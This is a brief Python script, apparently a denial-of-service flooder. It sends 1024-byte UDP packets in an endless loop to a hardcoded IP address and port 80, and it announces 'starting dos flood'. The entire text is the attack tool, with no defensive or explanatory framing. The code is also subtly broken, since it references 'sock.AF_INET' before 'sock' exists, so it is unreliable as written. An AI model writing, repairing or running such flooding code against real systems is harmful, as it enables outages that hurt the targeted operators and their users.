import socket

target_ip = '123.23.23.1'
target_port = 80

sock = socket.socket(sock.AF_INET, socket.SOCK_DGRAM)
packet = b"A" * 1024

print("starting dos flood")

while True:
	sock.sendto(packet,(target_ip,target_port))
